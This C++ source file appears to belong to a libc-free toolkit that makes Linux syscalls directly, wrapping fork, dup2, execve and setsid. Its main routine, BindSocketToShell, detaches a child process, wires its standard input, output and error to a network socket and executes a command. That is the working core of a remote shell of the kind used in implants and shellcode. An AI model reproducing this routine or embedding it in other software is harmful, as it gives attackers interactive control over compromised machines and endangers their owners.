/**
 * process.cc - Linux Process Execution Implementation
 *
 * Provides fork/exec functionality via direct syscalls.
 */

#include "process.h"
#include "syscall.h"
#include "system.h"

// Fork syscall wrapper
Result<SSIZE, Error> Process::Fork() noexcept
{
#if defined(ARCHITECTURE_AARCH64)
    // aarch64 uses clone with SIGCHLD flag for fork-like behavior
    constexpr USIZE SIGCHLD = 17;
    SSIZE result = System::Call(SYS_CLONE, SIGCHLD, 0, 0, 0, 0);
#else
    SSIZE result = System::Call(SYS_FORK);
#endif
    if (result < 0)
    {
        return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_ForkFailed);
    }
    return Result<SSIZE, Error>::Ok(result);
}

// Dup2 syscall wrapper
Result<SSIZE, Error> Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
{
#if defined(ARCHITECTURE_AARCH64)
    // aarch64 uses dup3 with flags=0 instead of dup2
    SSIZE result = System::Call(SYS_DUP3, (USIZE)oldfd, (USIZE)newfd, 0);
#else
    SSIZE result = System::Call(SYS_DUP2, (USIZE)oldfd, (USIZE)newfd);
#endif
    if (result < 0)
    {
        return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_Dup2Failed);
    }
    return Result<SSIZE, Error>::Ok(result);
}

// Execve syscall wrapper
Result<SSIZE, Error> Process::Execve(const CHAR *pathname, CHAR *const argv[], CHAR *const envp[]) noexcept
{
    SSIZE result = System::Call(SYS_EXECVE, (USIZE)pathname, (USIZE)argv, (USIZE)envp);
    if (result < 0)
    {
        return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_ExecveFailed);
    }
    return Result<SSIZE, Error>::Ok(result);
}

// Setsid syscall wrapper
Result<SSIZE, Error> Process::Setsid() noexcept
{
    SSIZE result = System::Call(SYS_SETSID);
    if (result < 0)
    {
        return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_SetsidFailed);
    }
    return Result<SSIZE, Error>::Ok(result);
}

// BindSocketToShell - Main function to bind a socket to a shell process
Result<SSIZE, Error> Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
{
    if (socketFd < 0 || cmd == nullptr)
    {
        return Result<SSIZE, Error>::Err(Error::Process_BindShellFailed);
    }

    auto forkResult = Fork();

    if (forkResult.IsErr())
    {
        // Fork failed
        return Result<SSIZE, Error>::Err(forkResult, Error::Process_BindShellFailed);
    }

    SSIZE pid = forkResult.Value();

    if (pid == 0)
    {
        // Child process

        // Create new session (detach from controlling terminal)
        (void)Setsid();

        // Redirect stdin/stdout/stderr to socket
        if (Dup2(socketFd, STDIN_FILENO).IsErr() ||
            Dup2(socketFd, STDOUT_FILENO).IsErr() ||
            Dup2(socketFd, STDERR_FILENO).IsErr())
        {
            System::Call(SYS_EXIT, 1);
        }

        // Close original socket fd if it's not one of the standard fds
        if (socketFd > STDERR_FILENO)
        {
            System::Call(SYS_CLOSE, (USIZE)socketFd);
        }

        // Build argv for execve
        // argv[0] = cmd, argv[1] = nullptr
        CHAR *argv[2];
        argv[0] = const_cast<CHAR *>(cmd);
        argv[1] = nullptr;

        // Empty environment
        CHAR *envp[1];
        envp[0] = nullptr;

        // Execute the command - this should not return
        (void)Execve(cmd, argv, envp);

        // If execve returns, something went wrong - exit child
        System::Call(SYS_EXIT, 1);
    }

    // Parent process - return child PID
    return Result<SSIZE, Error>::Ok(pid);
}
